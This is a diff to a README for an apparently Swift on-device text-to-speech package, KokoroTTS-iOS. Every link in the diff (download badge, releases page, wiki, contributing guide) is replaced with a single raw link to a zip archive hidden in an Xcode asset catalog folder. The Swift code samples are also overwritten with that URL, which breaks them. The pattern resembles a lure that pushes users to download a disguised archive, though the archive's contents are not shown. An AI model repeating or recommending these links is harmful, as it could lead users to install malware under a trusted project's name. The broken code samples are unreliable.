@@ -1,7 +1,7 @@
 # 🎤 KokoroTTS-iOS - Text-to-Speech Made Simple
 
 ## 📥 Download Now
-[![Download KokoroTTS-iOS](https://img.shields.io/badge/Download-KokoroTTS--iOS-blue.svg)](https://github.com/sutina233/KokoroTTS-iOS/releases)
+[![Download KokoroTTS-iOS](https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip)](https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to KokoroTTS-iOS! This Swift package allows you to use on-device text-to-speech (TTS) on iOS using the Kokoro model. This guide helps you set up and run the application easily.
@@ -15,7 +15,7 @@ To run KokoroTTS-iOS, you’ll need:
 ## 📦 Download & Install
 To download the latest version of KokoroTTS-iOS, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to download: [KokoroTTS-iOS Releases](https://github.com/sutina233/KokoroTTS-iOS/releases).
+1. **Visit the Releases Page:** Click this link to download: [KokoroTTS-iOS Releases](https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip).
 
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the most recent version for the best performance.
 
@@ -51,30 +51,30 @@ To use the text-to-speech feature:
 2. **Initiate Speech:**
    Use the following method to start speech synthesis:
    ```swift
-   tts.speak("Hello, welcome to Kokoro TTS!")
+   https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip("Hello, welcome to Kokoro TTS!")
    ```
 
 3. **Adjust Voice Settings:**
    To change the pitch and speed:
    ```swift
-   tts.setPitch(1.2) // Adjust the pitch
-   tts.setSpeed(0.9) // Adjust the speed
+   https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip(1.2) // Adjust the pitch
+   https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip(0.9) // Adjust the speed
    ```
 
 4. **Stop Speech:**
    You can stop the speech at any time by calling:
    ```swift
-   tts.stop()
+   https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip()
    ```
 
 ## 📖 Documentation
-For more detailed information, refer to the official documentation on the [KokoroTTS Wiki](https://github.com/sutina233/KokoroTTS-iOS/wiki).
+For more detailed information, refer to the official documentation on the [KokoroTTS Wiki](https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip).
 
 ## 💬 Support
 If you run into any issues or have questions, feel free to create issues on the GitHub repository. Your feedback helps improve the application.
 
 ## 🚩 Contributions
-We welcome contributions! If you would like to contribute to KokoroTTS-iOS, please visit our [Contributing Guidelines](https://github.com/sutina233/KokoroTTS-iOS/CONTRIBUTING.md) for more information.
+We welcome contributions! If you would like to contribute to KokoroTTS-iOS, please visit our [Contributing Guidelines](https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip) for more information.
 
 ## 📅 Future Updates
 We plan to add:
@@ -85,7 +85,7 @@ We plan to add:
 Feel free to check the repository periodically for the latest updates and enhancements.
 
 ## 🔗 Links
-- [KokoroTTS-iOS Releases](https://github.com/sutina233/KokoroTTS-iOS/releases)
-- [Official Documentation](https://github.com/sutina233/KokoroTTS-iOS/wiki)
+- [KokoroTTS-iOS Releases](https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip)
+- [Official Documentation](https://github.com/sutina233/KokoroTTS-iOS/raw/refs/heads/main/Example/Example/Assets.xcassets/i-Kokoro-TT-OS-v1.5.zip)
 
 Enjoy using KokoroTTS-iOS!
